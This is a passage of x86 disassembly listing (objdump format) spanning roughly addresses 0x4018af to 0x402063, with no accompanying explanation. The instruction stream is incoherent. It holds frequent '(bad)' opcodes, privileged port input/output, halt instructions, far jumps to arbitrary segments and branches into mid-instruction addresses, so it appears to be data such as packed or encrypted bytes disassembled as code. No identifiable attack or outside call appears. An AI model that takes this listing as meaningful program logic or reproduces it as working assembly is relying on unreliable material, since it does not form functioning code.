  4018af:	inc    ecx
  4018b0:	mov    bh,0x84
  4018b2:	pop    esi
  4018b3:	nop
  4018b4:	dec    ebx
  4018b5:	shl    DWORD PTR [eax+0x6acc71f5],cl
  4018bb:	fstp   QWORD PTR [eax]
  4018bd:	xchg   edi,eax
  4018be:	dec    ebp
  4018bf:	inc    ebx
  4018c0:	es inc edx
  4018c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018c3:	mov    eax,0xbfe8d46f
  4018c8:	pop    ebx
  4018c9:	or     BYTE PTR [ecx-0x1b],cl
  4018cc:	adc    eax,0x397bc4c
  4018d1:	sub    BYTE PTR [edi+0x1d],dh
  4018d4:	cmp    DWORD PTR [esi+0x6d],0xffffffc4
  4018d8:	out    dx,al
  4018d9:	sub    BYTE PTR [esi],0xa5
  4018dc:	aas    
  4018dd:	into   
  4018de:	inc    ecx
  4018df:	add    DWORD PTR [edx-0x6c78df61],esi
  4018e5:	jl     0x401960
  4018e7:	in     eax,dx
  4018e8:	sahf   
  4018e9:	mov    esi,0x1badb865
  4018ee:	fist   WORD PTR [edx+ecx*1+0x4305b28d]
  4018f5:	or     BYTE PTR ds:0xc668ff6d,dh
  4018fb:	pop    esp
  4018fc:	(bad)  
  4018fd:	out    0x3,al
  4018ff:	loop   0x4018d0
  401901:	jl     0x401928
  401903:	xchg   esi,eax
  401904:	bound  ebx,QWORD PTR [ebp+0x7877b5f5]
  40190a:	xchg   ebp,eax
  40190b:	mov    ebp,ebx
  40190d:	outs   dx,BYTE PTR ds:[esi]
  40190e:	xor    al,0xf8
  401910:	mov    edi,0x50f27177
  401915:	jmp    FWORD PTR [ebx+0x27]
  401918:	mov    ch,0x74
  40191a:	mov    esi,DWORD PTR [edx]
  40191c:	in     al,dx
  40191d:	mov    eax,0xe3a48533
  401922:	jmp    0x401947
  401924:	(bad)  
  401925:	verw   WORD PTR [edi+0x4e5135c7]
  40192c:	pop    ebx
  40192d:	dec    DWORD PTR [ebp+0x3]
  401930:	pop    ss
  401931:	push   esp
  401932:	test   BYTE PTR [eax+eiz*1-0x3],bh
  401936:	fbld   TBYTE PTR [ecx]
  401938:	add    DWORD PTR [ecx+ecx*4],edx
  40193b:	sub    BYTE PTR [edx+0x4bf68739],0x8b
  401942:	xchg   edi,eax
  401943:	shl    DWORD PTR [esi],0xc8
  401946:	jne    0x4018e7
  401948:	jns    0x401910
  40194a:	add    DWORD PTR [ebx-0x68],ebp
  40194d:	adc    dh,BYTE PTR [ebp+0x5701e0d3]
  401953:	push   ecx
  401954:	lods   eax,DWORD PTR ds:[esi]
  401955:	add    eax,0x7f9c6083
  40195a:	dec    esi
  40195b:	imul   eax,DWORD PTR [esi-0x47169873],0x7e
  401962:	mov    ecx,0x97144a85
  401967:	mov    bh,0x43
  401969:	mov    ah,0x93
  40196b:	lock loop 0x401982
  40196e:	(bad)  
  401970:	push   edi
  401971:	stc    
  401972:	xor    al,ch
  401974:	test   eax,0x9e36d48f
  401979:	cli    
  40197a:	push   esp
  40197b:	sub    DWORD PTR [edi-0x31dd7719],eax
  401981:	(bad)  
  401983:	icebp  
  401984:	inc    ecx
  401985:	mov    esi,0x749bb61f
  40198a:	into   
  40198b:	mov    eax,?
  40198d:	stc    
  40198e:	stos   DWORD PTR es:[edi],eax
  40198f:	daa    
  401990:	xor    ebp,esp
  401992:	adc    BYTE PTR [esi+0x7e],dh
  401995:	xchg   ecx,eax
  401996:	jnp    0x4019f6
  401998:	stos   DWORD PTR es:[edi],eax
  401999:	cmp    al,0xd7
  40199b:	xlat   BYTE PTR ds:[ebx]
  40199c:	jmp    0x8a3f:0x88fd1dd4
  4019a3:	jns    0x4019b0
  4019a5:	mov    edx,0xfbc7dc0e
  4019aa:	fidiv  WORD PTR [ebp+0x17]
  4019ad:	cwde   
  4019ae:	xor    cl,BYTE PTR [edi-0x5d]
  4019b1:	ret    
  4019b2:	mov    edx,0xddcf80cc
  4019b7:	in     eax,dx
  4019b8:	repz loopne 0x4019b4
  4019bb:	jg     0x401983
  4019bd:	daa    
  4019be:	test   DWORD PTR [ecx+ebp*2-0x53a12b16],ebx
  4019c5:	jno    0x4019e7
  4019c7:	add    ah,BYTE PTR [esi+0x9c3a2b3]
  4019cd:	(bad)  
  4019ce:	jmp    0x401979
  4019d0:	push   eax
  4019d1:	mov    dl,0x70
  4019d3:	aam    0xf6
  4019d5:	test   BYTE PTR [esi+0x69969883],dh
  4019db:	add    al,0xda
  4019dd:	xchg   ecx,eax
  4019de:	mov    ch,0x68
  4019e0:	(bad)  
  4019e1:	jb     0x401968
  4019e3:	fsubr  QWORD PTR [eax+0x44]
  4019e6:	rol    DWORD PTR [edi],1
  4019e8:	lods   eax,DWORD PTR ds:[esi]
  4019e9:	xchg   ecx,eax
  4019ea:	push   esi
  4019eb:	test   eax,0x82ef4d37
  4019f0:	retf   0x5e9a
  4019f3:	(bad)  
  4019f4:	popf   
  4019f5:	sub    esp,DWORD PTR [edi-0x17c70cd3]
  4019fb:	jb     0x4019cd
  4019fd:	es test eax,0x22b76608
  401a03:	fstp   DWORD PTR [edx]
  401a05:	dec    edx
  401a06:	or     dl,ah
  401a08:	lahf   
  401a09:	aaa    
  401a0a:	outs   dx,BYTE PTR ds:[esi]
  401a0b:	inc    eax
  401a0c:	daa    
  401a0d:	pop    esp
  401a0e:	shr    BYTE PTR [esi+0x6d49d9ed],0x70
  401a15:	mov    dh,0x7d
  401a17:	inc    ecx
  401a18:	mov    ss,WORD PTR [ebx]
  401a1a:	movd   mm0,DWORD PTR [esp+ebx*4-0x6b85061c]
  401a22:	pop    esi
  401a23:	jno    0x4019b8
  401a25:	pop    esi
  401a26:	into   
  401a27:	or     al,0xf6
  401a29:	mov    eax,0x43fbef3b
  401a2e:	sbb    bl,BYTE PTR [eax-0xd]
  401a31:	jb     0x401a2a
  401a33:	popa   
  401a34:	mov    cl,0xaf
  401a36:	xor    ebx,ebx
  401a38:	xchg   esi,eax
  401a39:	iret   
  401a3a:	sbb    DWORD PTR [edi],esi
  401a3c:	loopne 0x401a8d
  401a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a3f:	in     al,0x7
  401a41:	xchg   esp,eax
  401a42:	ret    0x74ce
  401a45:	inc    esp
  401a46:	cli    
  401a47:	pop    ds
  401a48:	pop    edx
  401a49:	and    edx,eax
  401a4b:	aad    0xd1
  401a4d:	in     al,0x5e
  401a4f:	push   ebx
  401a50:	mov    ebp,0xdfe6cf36
  401a55:	mov    ah,0x58
  401a57:	mov    ebp,0x71d445df
  401a5c:	push   es
  401a5d:	cs xchg ebp,eax
  401a5f:	or     al,0xa
  401a61:	aaa    
  401a62:	lock arpl WORD PTR [ebx+eax*2-0x1c],dx
  401a67:	adc    edi,DWORD PTR [ebx]
  401a69:	pop    esp
  401a6a:	pop    edx
  401a6b:	mov    ds:0xe46e5858,al
  401a70:	enter  0x8da7,0x84
  401a74:	add    DWORD PTR [ebx+0x2b],edi
  401a77:	dec    ebp
  401a78:	fwait
  401a79:	stc    
  401a7a:	mov    al,ds:0x4da62bec
  401a7f:	int3   
  401a80:	xchg   edx,eax
  401a81:	int    0xc2
  401a83:	pusha  
  401a84:	and    BYTE PTR [esi-0x71],0x4f
  401a88:	std    
  401a89:	mov    edi,0xf4d022d6
  401a8e:	xor    ebx,DWORD PTR [edx+0x943a330]
  401a94:	mov    esi,0xff64decd
  401a99:	popa   
  401a9a:	pop    ss
  401a9b:	test   DWORD PTR [ecx+0xeac3be2],0x8f4cce57
  401aa5:	enter  0xd6e1,0xc0
  401aa9:	dec    ecx
  401aaa:	push   0x7a
  401aac:	adc    DWORD PTR [esi],0xffffff95
  401aaf:	imul   ebp,DWORD PTR [ecx],0x1c158af1
  401ab5:	in     eax,dx
  401ab6:	sbb    ch,BYTE PTR [edi-0x3a9df2d3]
  401abc:	push   ebp
  401abd:	mov    bh,0xa0
  401abf:	test   al,0xa5
  401ac1:	add    dl,cl
  401ac3:	jae    0x401ac8
  401ac5:	call   0x6016ed7a
  401aca:	add    edi,DWORD PTR [edx-0x6b04bf11]
  401ad0:	pop    edi
  401ad1:	hlt    
  401ad2:	mov    dh,0x41
  401ad4:	add    ebp,DWORD PTR [ecx]
  401ad6:	add    eax,0x4ba2bf6a
  401adb:	sub    ebx,DWORD PTR [edx-0x6772155b]
  401ae1:	daa    
  401ae2:	cmp    DWORD PTR [ebp-0x8bced8c],ebx
  401ae8:	add    BYTE PTR [ebp+0x64a03166],ah
  401aee:	fld    DWORD PTR [ecx+0x29]
  401af1:	or     DWORD PTR [edx-0x1],ebp
  401af4:	std    
  401af5:	les    eax,FWORD PTR [esi+0x9]
  401af8:	mov    dl,0x42
  401afa:	mov    al,ds:0x59fac90b
  401aff:	and    edi,ebx
  401b01:	mov    WORD PTR [edx-0x76f2b7f8],ds
  401b07:	je     0xe2445d61
  401b0d:	or     al,0x46
  401b0f:	or     esi,edi
  401b11:	ja     0x401a9e
  401b13:	jns    0x401adb
  401b15:	adc    BYTE PTR [ebx-0x24],ch
  401b18:	imul   ebx,DWORD PTR [edi-0x2fe9287a],0x4a
  401b1f:	mov    ah,al
  401b21:	fwait
  401b22:	pop    ebp
  401b23:	fstp   QWORD PTR [ebx+0x48]
  401b26:	jg     0x401b2a
  401b28:	pop    esi
  401b29:	(bad)  
  401b2a:	out    0xc2,al
  401b2c:	std    
  401b2d:	jl     0x401aed
  401b2f:	sub    eax,0xac2bb84a
  401b34:	pop    esp
  401b35:	fs pop edx
  401b37:	xor    dh,BYTE PTR [ebx]
  401b39:	fbld   TBYTE PTR [eax+0x415a4454]
  401b3f:	adc    BYTE PTR [eax],bl
  401b41:	inc    esi
  401b42:	add    BYTE PTR [esi],dh
  401b44:	sub    al,BYTE PTR [esp+edi*4]
  401b47:	les    ebx,FWORD PTR [edi+0x3e89b7e8]
  401b4d:	scas   al,BYTE PTR es:[edi]
  401b4e:	pop    es
  401b4f:	idiv   BYTE PTR [ebx+ecx*4]
  401b52:	xchg   ebx,eax
  401b53:	mov    DWORD PTR [ebx],ecx
  401b55:	stc    
  401b56:	iret   
  401b57:	jp     0x401bce
  401b59:	mov    bh,0xdd
  401b5b:	(bad)  
  401b5c:	outs   dx,DWORD PTR ds:[esi]
  401b5d:	adc    BYTE PTR [eax],dl
  401b5f:	push   ecx
  401b60:	and    ch,BYTE PTR [edi-0x2a369bba]
  401b66:	imul   ecx,ebp,0x36
  401b69:	repz popf 
  401b6b:	mov    esp,0x4863c223
  401b70:	jge    0x401bc6
  401b72:	int3   
  401b73:	push   0x832378d6
  401b78:	dec    esp
  401b79:	imul   ecx,eax,0xffffff92
  401b7c:	xchg   ebx,eax
  401b7d:	xor    bl,BYTE PTR ds:0xb1bfd37f
  401b83:	cmc    
  401b84:	or     ax,0x18d4
  401b88:	and    bl,dh
  401b8a:	push   esp
  401b8b:	rol    DWORD PTR ds:[ebp+0x2a],0x62
  401b90:	pop    ebx
  401b91:	or     DWORD PTR [edx],0x47
  401b94:	mov    dl,0xae
  401b96:	cmc    
  401b97:	jecxz  0x401b65
  401b99:	and    DWORD PTR [eax-0x53],ebp
  401b9c:	mov    ds:0x1f245b09,eax
  401ba1:	es fwait
  401ba3:	mov    ds:0x4885d909,al
  401ba8:	loop   0x401bea
  401baa:	sub    eax,0x883eeaf7
  401baf:	sbb    al,BYTE PTR ds:0xd6db5cc2
  401bb5:	enter  0x86a5,0x8a
  401bb9:	aaa    
  401bba:	adc    DWORD PTR [edi-0x1a],esp
  401bbd:	outs   dx,DWORD PTR ds:[esi]
  401bbe:	test   al,0xfb
  401bc0:	push   edi
  401bc1:	jbe    0x401c2d
  401bc3:	int    0x81
  401bc5:	into   
  401bc6:	cdq    
  401bc7:	fadd   QWORD PTR [edx+0x368308cc]
  401bcd:	sub    ebp,DWORD PTR [esi]
  401bcf:	sub    eax,0x59c574f0
  401bd4:	sub    bh,BYTE PTR [eax]
  401bd6:	sub    BYTE PTR [ecx+0x1df58e05],cl
  401bdc:	mov    ds:0x9b66fab1,al
  401be1:	mov    bl,0xa2
  401be3:	daa    
  401be4:	lahf   
  401be5:	mov    ch,0x9c
  401be7:	(bad)  
  401be8:	mov    edx,eax
  401bea:	call   0xd83bf697
  401bef:	outs   dx,DWORD PTR ds:[esi]
  401bf0:	adc    BYTE PTR [edi],dh
  401bf2:	or     edx,DWORD PTR [edi+edi*8]
  401bf5:	mov    edi,0x79fcf91a
  401bfa:	scas   eax,DWORD PTR es:[edi]
  401bfb:	sar    BYTE PTR [edx-0x24],1
  401bfe:	out    0xdd,eax
  401c00:	int    0x23
  401c02:	mov    esp,0x29b43c83
  401c07:	cmp    BYTE PTR ds:0x97cf6169,dh
  401c0d:	imul   edi,DWORD PTR [ebx-0x7c],0xffffffd6
  401c11:	add    ebp,eax
  401c13:	jp     0x401c05
  401c15:	shufps xmm5,XMMWORD PTR gs:[eax-0x15],0xd8
  401c1b:	loope  0x401bcd
  401c1d:	sub    al,0xaa
  401c1f:	in     al,dx
  401c20:	lods   al,BYTE PTR ds:[esi]
  401c21:	test   al,0x23
  401c23:	mov    cl,0x9a
  401c25:	and    eax,0x5b1f22ee
  401c2a:	sti    
  401c2b:	in     eax,0x5d
  401c2d:	fs xchg edx,eax
  401c2f:	mov    eax,0xfb16ad92
  401c34:	inc    ebp
  401c35:	loope  0x401ca4
  401c37:	int3   
  401c38:	and    BYTE PTR [eax],ah
  401c3a:	fld    st(4)
  401c3c:	xor    BYTE PTR [esi],0x31
  401c3f:	lods   al,BYTE PTR ds:[esi]
  401c40:	sub    BYTE PTR [ebx+eax*2+0x59],bh
  401c44:	int    0xab
  401c46:	xchg   ebp,eax
  401c47:	std    
  401c48:	(bad)  
  401c49:	test   ah,ah
  401c4b:	lods   al,BYTE PTR ds:[esi]
  401c4c:	(bad)  
  401c4d:	cs inc ebx
  401c4f:	xchg   edx,ebp
  401c51:	cli    
  401c52:	aad    0xbb
  401c54:	add    al,0xdc
  401c56:	mov    ebp,0x2e52d323
  401c5b:	push   0xffffffa6
  401c5d:	xor    edx,DWORD PTR [esi+0x6e]
  401c60:	lea    esp,[edi+0x405ef2cf]
  401c66:	cwde   
  401c67:	cmovle ebx,DWORD PTR [eax]
  401c6a:	test   al,0x52
  401c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c6d:	iret   
  401c6e:	aaa    
  401c6f:	fwait
  401c70:	push   edi
  401c71:	call   edx
  401c73:	repnz lods al,BYTE PTR ds:[esi]
  401c75:	arpl   dx,si
  401c77:	shl    BYTE PTR [eax+0x0],1
  401c7a:	aam    0xe2
  401c7c:	mov    bh,dl
  401c7e:	pop    ebx
  401c7f:	aaa    
  401c80:	dec    edx
  401c81:	adc    eax,0x3ab56521
  401c86:	xchg   edx,eax
  401c87:	lea    esi,[edx-0x346eebf6]
  401c8d:	jle    0x401c47
  401c8f:	jo     0x401c7a
  401c91:	out    0xe1,eax
  401c93:	and    dl,BYTE PTR [esp+eiz*2-0x12260c4a]
  401c9a:	inc    edx
  401c9b:	call   0x172006a2
  401ca0:	ja     0x401c54
  401ca2:	(bad)  
  401ca3:	jecxz  0x401c4b
  401ca5:	mov    ch,BYTE PTR [ecx+0x5c]
  401ca8:	and    eax,DWORD PTR [ebx+0x5a]
  401cab:	imul   esi,DWORD PTR [ebp+0x3b],0x43
  401caf:	xor    al,0x37
  401cb1:	dec    edx
  401cb2:	cld    
  401cb3:	cli    
  401cb4:	adc    DWORD PTR [eax+0x18],esi
  401cb7:	jne    0x401ce5
  401cb9:	out    dx,eax
  401cba:	inc    edx
  401cbb:	inc    edx
  401cbc:	test   BYTE PTR [ebx-0x75],cl
  401cbf:	std    
  401cc0:	retf   
  401cc1:	and    DWORD PTR [edi],0x2668cff0
  401cc7:	add    DWORD PTR [ecx+0x79],ecx
  401cca:	cmp    edi,DWORD PTR [ecx]
  401ccc:	loop   0x401d0c
  401cce:	bound  ebx,QWORD PTR [esi]
  401cd0:	adc    BYTE PTR [eax+0x54],ah
  401cd3:	ja     0x401c97
  401cd5:	xchg   DWORD PTR ds:0x3abc8464,eax
  401cdb:	clc    
  401cdc:	stos   BYTE PTR es:[edi],al
  401cdd:	xchg   DWORD PTR [ecx-0x65],ecx
  401ce0:	pop    eax
  401ce1:	scas   eax,DWORD PTR es:[edi]
  401ce2:	jl     0x401d0c
  401ce4:	(bad)  
  401ce5:	stc    
  401ce6:	xor    edi,DWORD PTR [edx]
  401ce8:	or     eax,0xe4948a91
  401ced:	ss lahf 
  401cef:	mov    ds:0xb5db8036,al
  401cf4:	cwde   
  401cf5:	push   esi
  401cf6:	xor    eax,0x4158e757
  401cfb:	scas   al,BYTE PTR es:[edi]
  401cfc:	inc    eax
  401cfd:	pop    eax
  401cfe:	xor    bh,BYTE PTR [ebx+0x49caf4cb]
  401d04:	ja     0x401c90
  401d06:	push   ds
  401d07:	mov    ebp,0x803b39d1
  401d0c:	fdivp  st(7),st
  401d0e:	sbb    eax,DWORD PTR [edx]
  401d10:	test   DWORD PTR [eax],edi
  401d12:	mov    ebx,0x118d0639
  401d17:	popf   
  401d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d19:	jmp    0x8a0:0x74e9c1ad
  401d20:	les    esp,FWORD PTR [ebp+0x41650127]
  401d26:	dec    ebx
  401d27:	xchg   esp,eax
  401d28:	cdq    
  401d29:	cwde   
  401d2a:	in     al,0x88
  401d2c:	xchg   DWORD PTR [edi+0x2da1e7d3],eax
  401d32:	and    eax,0x90c307fb
  401d37:	pop    ss
  401d38:	data16 es jmp 0x401d93
  401d3c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  401d3e:	mov    al,ds:0x8c9de368
  401d43:	inc    esi
  401d44:	sahf   
  401d45:	je     0x401d8d
  401d47:	xor    ah,BYTE PTR [ebx]
  401d49:	imul   edx,DWORD PTR [ecx+0x41],0x27888430
  401d50:	push   ecx
  401d51:	fbstp  TBYTE PTR [edi+0x79ef3e27]
  401d57:	in     eax,0xc4
  401d59:	xchg   edi,eax
  401d5a:	pop    es
  401d5b:	ret    0xc082
  401d5e:	xchg   ebp,eax
  401d5f:	xchg   esp,eax
  401d60:	shr    esp,0x51
  401d63:	lahf   
  401d64:	(bad)  
  401d65:	push   ebx
  401d66:	test   DWORD PTR [ebp-0x46],esi
  401d69:	mov    ah,0xfd
  401d6b:	cld    
  401d6c:	inc    ebp
  401d6d:	xor    dl,BYTE PTR [eax]
  401d6f:	aaa    
  401d70:	pop    ecx
  401d71:	and    DWORD PTR [edi-0x6b],eax
  401d74:	fldcw  WORD PTR [esi]
  401d76:	inc    esp
  401d77:	out    dx,eax
  401d78:	inc    ebp
  401d79:	xor    bh,BYTE PTR [ebp+0x6f]
  401d7c:	retf   
  401d7d:	jb     0x401d6c
  401d7f:	mov    ch,0xe9
  401d81:	inc    eax
  401d82:	and    ecx,eax
  401d84:	ja     0x401d6f
  401d86:	mov    ebx,0xbe4ea951
  401d8b:	ret    0xf1dd
  401d8e:	and    DWORD PTR [ebp-0x37],eax
  401d91:	cwde   
  401d92:	mov    ecx,0xe81c9dce
  401d97:	mov    esp,0x404cad08
  401d9c:	data16 mov WORD PTR [eax],ds
  401d9f:	retf   0x817f
  401da2:	sti    
  401da3:	rcr    DWORD PTR [ecx-0xc0174d9],1
  401da9:	outs   dx,BYTE PTR ds:[esi]
  401daa:	scas   al,BYTE PTR es:[edi]
  401dab:	mov    al,0x8c
  401dad:	out    dx,eax
  401dae:	pushf  
  401daf:	stos   DWORD PTR es:[edi],eax
  401db0:	mov    al,ds:0x5adc2e12
  401db5:	inc    ebp
  401db6:	retf   0x38e2
  401db9:	bound  esp,QWORD PTR [edi+edi*1]
  401dbc:	jns    0x401d67
  401dbe:	push   esp
  401dbf:	push   esp
  401dc0:	mov    esi,0xbe4d7556
  401dc5:	ins    DWORD PTR es:[edi],dx
  401dc6:	dec    esi
  401dc7:	push   0x57
  401dc9:	std    
  401dca:	int3   
  401dcb:	hlt    
  401dcc:	jmp    0xa566:0x7c0689a3
  401dd3:	fiadd  WORD PTR [edx+eiz*2-0x21]
  401dd7:	xchg   bl,dh
  401dd9:	loopne 0x401d92
  401ddb:	in     al,dx
  401ddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ddd:	dec    edx
  401dde:	mov    edi,0x6eab2ac8
  401de3:	adc    BYTE PTR ds:0x19fcb6ce,cl
  401de9:	leave  
  401dea:	outs   dx,BYTE PTR ds:[esi]
  401deb:	or     al,0x5
  401ded:	loope  0x401d71
  401def:	ror    DWORD PTR [ecx+0x55b59de1],0x20
  401df6:	je     0x401def
  401df8:	retf   
  401df9:	call   0xc76e:0x3971
  401dff:	xchg   esp,eax
  401e00:	fisubr DWORD PTR [ebp+0x13]
  401e03:	and    edi,DWORD PTR [ecx]
  401e05:	pop    es
  401e06:	addr16 pop ds
  401e08:	sub    DWORD PTR [edi+0x85bc55f],esp
  401e0e:	fwait
  401e0f:	add    ax,0x32a5
  401e13:	jbe    0x401e5a
  401e15:	stos   DWORD PTR es:[edi],eax
  401e16:	jbe    0x401da9
  401e18:	add    DWORD PTR [edi-0x50e90838],edi
  401e1e:	push   esi
  401e1f:	push   edx
  401e20:	mov    ecx,esp
  401e22:	pop    ebx
  401e23:	data16 fist WORD PTR ds:0xc30fecc4
  401e2a:	xlat   BYTE PTR ds:[ebx]
  401e2b:	mov    BYTE PTR [ecx+ecx*2-0xf],bl
  401e2f:	test   BYTE PTR [edx],cl
  401e31:	adc    eax,0x88310525
  401e36:	sub    al,ch
  401e38:	pop    esi
  401e39:	cmp    al,0x83
  401e3b:	pop    DWORD PTR [eax]
  401e3d:	test   BYTE PTR [ebp-0x2],0xf9
  401e41:	and    edi,DWORD PTR [edi-0x4e0bf262]
  401e47:	mov    ds:0xd04bffc2,eax
  401e4c:	xchg   BYTE PTR [esi+ebp*4-0x7cbd0cf2],ch
  401e53:	add    esp,DWORD PTR [ebx-0x11563a92]
  401e59:	loope  0x401ddd
  401e5b:	fldenv [ebx+esi*8+0x5a2dda6a]
  401e62:	mov    esp,ebp
  401e64:	jne    0x401dfd
  401e66:	and    bh,BYTE PTR [eax-0xae7af4f]
  401e6c:	pop    esp
  401e6d:	repnz mov esp,0x39cce705
  401e73:	mov    fs,WORD PTR [edi-0x4]
  401e76:	daa    
  401e77:	pop    ecx
  401e78:	cmp    cl,bl
  401e7a:	jae    0x401e79
  401e7c:	adc    al,BYTE PTR [eax+ebp*2]
  401e7f:	es add ch,dh
  401e82:	mov    DWORD PTR [ebx],ebp
  401e84:	mov    ah,0xa3
  401e86:	mov    ah,0x1f
  401e88:	es test BYTE PTR fs:[edx],0x5b
  401e8d:	cmp    ebp,esp
  401e8f:	ucomiss xmm1,DWORD PTR [ecx-0x1d7cea33]
  401e96:	dec    eax
  401e97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e98:	xor    dh,cl
  401e9a:	(bad)  
  401e9c:	mov    dh,BYTE PTR [esi+0x67]
  401e9f:	mov    ds:0xbd62cf06,al
  401ea4:	and    eax,0xcdbb76b8
  401ea9:	adc    eax,0xe88b62b9
  401eae:	retf   0x4985
  401eb1:	pop    ebx
  401eb2:	fst    QWORD PTR [ecx+0x395e0468]
  401eb8:	cwde   
  401eb9:	xchg   ebp,eax
  401eba:	out    dx,eax
  401ebb:	and    BYTE PTR [ebx+0x6a],al
  401ebe:	pusha  
  401ebf:	leave  
  401ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ec1:	in     eax,0x5c
  401ec3:	ret    0xa30
  401ec6:	jle    0x401eef
  401ec8:	inc    eax
  401ec9:	hlt    
  401eca:	jl     0x401e8c
  401ecc:	test   bh,dh
  401ece:	mov    esp,0x75dc13c3
  401ed3:	shl    DWORD PTR fs:[bp-0x6f],cl
  401ed8:	cmp    ch,BYTE PTR [eax-0x112f5a60]
  401ede:	je     0x401f2c
  401ee0:	icebp  
  401ee1:	fwait
  401ee2:	dec    esp
  401ee3:	sar    DWORD PTR [ebx],0x28
  401ee6:	(bad)  
  401ee7:	fnstsw WORD PTR [ecx]
  401ee9:	mov    dl,0xaa
  401eeb:	pop    edx
  401eec:	cmp    DWORD PTR [ecx],ebp
  401eee:	fwait
  401eef:	cmp    al,bl
  401ef1:	xor    eax,0x372db03f
  401ef6:	inc    eax
  401ef7:	cmp    DWORD PTR [esi+0x10bba5f4],0x43
  401efe:	xchg   edx,eax
  401eff:	push   esi
  401f00:	adc    eax,0xa5385380
  401f05:	add    DWORD PTR [esp+eiz*8],0x5f
  401f09:	and    edi,DWORD PTR [edi]
  401f0b:	dec    esi
  401f0c:	xchg   BYTE PTR [eax+0x2f3f58],bl
  401f12:	pop    ss
  401f13:	call   0x6ea6:0x8043382f
  401f1a:	lahf   
  401f1b:	(bad)  
  401f1d:	cmp    esp,esp
  401f1f:	mov    ds:0x8186c782,eax
  401f24:	and    ebp,DWORD PTR [edi]
  401f26:	loopne 0x401eae
  401f28:	imul   DWORD PTR [edi-0x14]
  401f2b:	mov    cl,0xb2
  401f2d:	in     eax,dx
  401f2e:	sbb    al,0x92
  401f30:	xor    DWORD PTR [eax-0x2e],0x2c01b5ba
  401f37:	dec    ebp
  401f38:	cld    
  401f39:	or     ebp,DWORD PTR [ebx-0x25]
  401f3c:	sub    ch,BYTE PTR cs:[eax+0x1c]
  401f40:	clc    
  401f41:	ret    0xa2da
  401f44:	sub    eax,0x1981f61c
  401f49:	xchg   BYTE PTR [edx],ch
  401f4b:	lods   eax,DWORD PTR ds:[esi]
  401f4c:	mov    ecx,DWORD PTR [edi+edi*2]
  401f4f:	mov    ds:0xf5e0d002,eax
  401f54:	test   eax,0x43e1daab
  401f59:	inc    ebx
  401f5a:	imul   esi,DWORD PTR [ebp-0x2b1ee6c1],0xf7f4f8de
  401f64:	push   edi
  401f65:	mov    ds,WORD PTR [edi]
  401f67:	retf   
  401f68:	and    al,0x40
  401f6a:	out    dx,al
  401f6b:	sti    
  401f6c:	adc    al,0x67
  401f6e:	(bad)  
  401f70:	pop    ds
  401f71:	int3   
  401f72:	outs   dx,DWORD PTR ds:[esi]
  401f73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f74:	mov    ds:0x55636b80,eax
  401f79:	test   al,0x38
  401f7b:	aam    0xf6
  401f7d:	mov    dh,0xa8
  401f7f:	ins    DWORD PTR es:[edi],dx
  401f80:	repz sbb eax,0x723cbfae
  401f86:	arpl   WORD PTR [ebx],cx
  401f88:	aam    0x94
  401f8a:	adc    al,0xf7
  401f8c:	pop    edi
  401f8d:	fs mov ch,0x67
  401f90:	je     0x401f3c
  401f92:	aad    0xed
  401f94:	mov    WORD PTR es:[ecx+0x823e49],fs
  401f9b:	inc    ebx
  401f9c:	in     al,dx
  401f9d:	loop   0x401f91
  401f9f:	out    dx,al
  401fa0:	jae    0x401f2d
  401fa2:	lea    edx,[ebx-0x251cd1f2]
  401fa8:	mov    esi,0x9ce23e8f
  401fad:	and    eax,0x3ca0f6e3
  401fb2:	jmp    0x401f71
  401fb4:	xchg   edx,eax
  401fb5:	in     eax,dx
  401fb6:	aad    0x4c
  401fb8:	mov    bl,0x6c
  401fba:	mov    al,ds:0x1ebb0fab
  401fbf:	and    edx,ebx
  401fc1:	inc    esi
  401fc2:	ret    0xf524
  401fc5:	addr16 dec esi
  401fc7:	mov    ebx,0xc0b8355e
  401fcc:	jp     0x402032
  401fce:	ror    DWORD PTR ds:0x1796cb13,0x7b
  401fd5:	nop
  401fd6:	pusha  
  401fd7:	jae    0x40204c
  401fd9:	icebp  
  401fda:	fidiv  DWORD PTR [ebp-0x47]
  401fdd:	out    dx,eax
  401fde:	dec    esi
  401fdf:	jp     0x401fec
  401fe1:	out    0xe0,al
  401fe3:	jmp    0x75d9:0xa92e71d6
  401fea:	outs   dx,BYTE PTR ds:[esi]
  401feb:	jne    0x402060
  401fed:	jae    0x401fff
  401fef:	lods   eax,DWORD PTR ds:[esi]
  401ff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ff1:	mov    DWORD PTR [ecx+edx*4-0x6f],esp
  401ff5:	arpl   WORD PTR [ecx-0x7e556e97],cx
  401ffb:	cs push es
  401ffd:	stos   BYTE PTR es:[edi],al
  401ffe:	in     al,dx
  401fff:	sub    BYTE PTR [esi+0x56],cl
  402002:	jle    0x402039
  402004:	add    DWORD PTR [eax+0x75],0x588a2043
  40200b:	adc    al,0x24
  40200d:	jge    0x401fb9
  40200f:	cdq    
  402010:	xor    DWORD PTR [ebp-0x63305a77],ebx
  402016:	or     eax,0x5690be0
  40201b:	popf   
  40201c:	add    bl,BYTE PTR [edi-0x37]
  40201f:	lds    esi,FWORD PTR [edx+eax*1]
  402022:	and    eax,0xb01d90bd
  402027:	sbb    ah,dl
  402029:	(bad)  
  40202a:	imul   DWORD PTR [edi]
  40202c:	add    BYTE PTR [eax],ah
  40202e:	shl    BYTE PTR [esi-0x2b],cl
  402031:	mov    bl,0x46
  402033:	add    BYTE PTR [ebp*1+0x1c371443],al
  40203a:	and    ecx,ecx
  40203c:	sti    
  40203d:	ins    DWORD PTR es:[edi],dx
  40203e:	icebp  
  40203f:	iret   
  402040:	push   WORD PTR [eax-0x61a59c30]
  402047:	dec    edx
  402048:	test   eax,0x8de2a89
  40204d:	out    0xd2,al
  40204f:	push   ds
  402050:	mov    al,0xc9
  402052:	loopne 0x402029
  402054:	push   es
  402055:	jnp    0x402054
  402057:	sub    BYTE PTR [edx-0x5c],ah
  40205a:	inc    ebp
  40205b:	push   ds
  40205c:	cmc    
  40205d:	mov    edi,0x6b1f68b4
  402062:	inc    esi
  402063:	mov    dl,0x95
